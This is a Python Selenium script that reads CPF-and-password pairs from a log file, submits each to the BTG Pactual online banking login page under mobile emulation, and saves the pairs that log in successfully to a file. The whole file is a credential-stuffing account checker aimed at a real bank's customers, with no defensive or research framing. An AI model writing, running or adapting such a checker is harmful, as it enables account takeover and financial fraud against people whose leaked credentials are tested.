from selenium import webdriver
from time import sleep
from datetime import datetime
from print_color import print
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
def Api(cpf,password):
    time = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    mobile_emulation = {
        "deviceMetrics": { "width": 375, "height": 812, "pixelRatio": 3.0 },
        "userAgent": "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19"
    }
    chrome_options = Options()
    chrome_options.add_experimental_option("mobileEmulation", mobile_emulation)
    driver = webdriver.Chrome( options=chrome_options,service=ChromeService(ChromeDriverManager().install()))
    url = "https://app.banking.btgpactual.com/login."
    driver.get(url)
    sleep(7)
    driver.find_element(By.XPATH,'//*[@id="0cpf"]').send_keys(cpf)
    driver.find_element(By.XPATH,'//*[@id="1senha"]').send_keys(password)
    driver.find_element(By.XPATH,'//*[@id="login-container"]/form/btg-button[1]/button').click()
    sleep(7)
    try:
        contents = driver.find_element(By.XPATH,'//*[@id="login-container"]/form/ul/li[3]/div/div[2]/btg-button/button/div/div').text
        print(f"CPF: {cpf} | PASSWORD: {password}", tag=f' {time} | BTG | 400 ', tag_color='red', color='magenta', background='grey')
    except:        
        with open(f"sucess.txt", "a+") as file1:
            file1.write(f"{cpf}|{password}\n")
        print(f"CPF: {cpf} | PASSWORD: {password}", tag=f' {time} | BTG | 200 ', tag_color='green', color='magenta', background='grey')
    driver.quit()
    
def ReadDB():
    arrays = []
    with open("log.txt", mode="r") as f:
        conute = f.readlines()
        arrays.append(conute)
    for lines in arrays[0]:
        try:
            lines_separador = lines.split("|")
            if(len(lines)>=5):
                cpf = lines_separador[0]
                cpf = cpf.replace("-","")
                cpf = cpf.replace(".","")
                password = lines_separador[1]
                if(cpf.isnumeric()==True ):
                    Api(cpf,password)
        except:
            pass
ReadDB()